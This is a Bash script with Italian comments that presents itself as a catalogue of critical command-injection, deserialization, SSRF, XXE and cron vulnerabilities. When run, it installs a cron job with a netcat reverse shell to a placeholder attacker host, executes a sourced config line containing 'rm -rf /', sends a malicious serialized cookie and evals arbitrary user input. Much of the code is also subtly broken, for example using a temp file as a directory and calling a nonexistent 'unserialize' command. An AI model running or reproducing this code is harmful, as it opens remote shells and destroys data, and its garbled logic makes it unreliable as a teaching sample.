#!/bin/bash

# Vulnerabilità di Iniezione di Comandi combinata con Manipolazione di Variabili di Ambiente e Race Condition (CVSS 3.1: 10.0 - Critico)
echo "Inserisci un comando (es. ls -l):"
read comando
TEMP_FILE=$(mktemp)
export PATH="$TEMP_FILE:$(echo $PATH | sed 's/:/\\:/g')" # Manipolazione di PATH
echo "#!/bin/bash" > "$TEMP_FILE/$(basename $comando)"
echo "$comando" >> "$TEMP_FILE/$(basename $comando)"
chmod +x "$TEMP_FILE/$(basename $comando)"
sleep 1 # Race condition
$(basename $comando)
rm -rf "$TEMP_FILE"

# Vulnerabilità di Deserializzazione di Oggetti tramite Cookie e Iniezione di Comandi (CVSS 3.1: 10.0 - Critico)
COOKIE=$(curl -s --cookie-jar - --cookie "$COOKIE_NAME=$(base64 -w0 <<< 'serialized=O:8:"Exploit":1:{s:4:"cmd";s:11:"rm -rf /tmp";}'; echo vulnerable)" "$URL") # Cookie dannoso
OBJECT=$(echo "$COOKIE" | grep -oP "(?<=serialized=)[^;]+")
if [[ -n "$OBJECT" ]]; then
  echo "$OBJECT" | base64 -d | unserialize # Comando "unserialize" dannoso
fi

# Vulnerabilità di SSRF combinata con Iniezione di Comandi e Manipolazione di Header HTTP (CVSS 3.1: 10.0 - Critico)
echo "Inserisci un URL (es. http://localhost/):"
read URL
echo "Inserisci un header HTTP (es. X-Forwarded-For: 127.0.0.1):"
read HEADER
RESPONSE=$(curl -s -H "$HEADER" "$URL")
if [[ "$RESPONSE" == *"vulnerable"* ]]; then
  echo "URL vulnerabile, esecuzione comando:"
  read COMMAND
  eval "$COMMAND"
fi

# Vulnerabilità di XXE combinata con Iniezione di Comandi tramite File XML (CVSS 3.1: 10.0 - Critico)
echo "Inserisci un documento XML (es. <!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]><foo>&xxe;</foo>):"
read XML_INPUT
TEMP_XML=$(mktemp)
echo "$XML_INPUT" > "$TEMP_XML"
xmllint --noent --dtdvalid "$TEMP_XML" | grep -q "root:" && echo "Vulnerabile, esecuzione comando:" && read COMMAND && eval "$COMMAND"
rm "$TEMP_XML"

# Vulnerabilità di Iniezione di Comandi tramite Cronjob e Manipolazione di Variabili di Ambiente (CVSS 3.1: 10.0 - Critico)
echo "PATH=/bin" > /tmp/cronjob_env
echo "* * * * * $(echo 'vulnerable; nc -e /bin/bash attacker_ip attacker_port')" > /tmp/cronjob
crontab -l > /tmp/current_crontab
cat /tmp/cronjob_env /tmp/cronjob >> /tmp/new_crontab
crontab /tmp/new_crontab
rm /tmp/cronjob /tmp/new_crontab

# Vulnerabilità di Manipolazione di File di Configurazione e Iniezione di Comandi (CVSS 3.1: 10.0 - Critico)
CONFIG_FILE="/tmp/config.ini"
echo "option1=value1" > "$CONFIG_FILE"
echo "option2=$(echo 'vulnerable; rm -rf /')" >> "$CONFIG_FILE"
echo "source $CONFIG_FILE" > /tmp/script.sh
chmod +x /tmp/script.sh
/tmp/script.sh
rm /tmp/script.sh $CONFIG_FILE

# Vulnerabilità di Iniezione di Comandi tramite Parameter Expansion e eval (CVSS 3.1: 9.8 - Critico)
echo "Inserisci un comando (es. ls -l):"
read comando
eval "${comando// /;}"
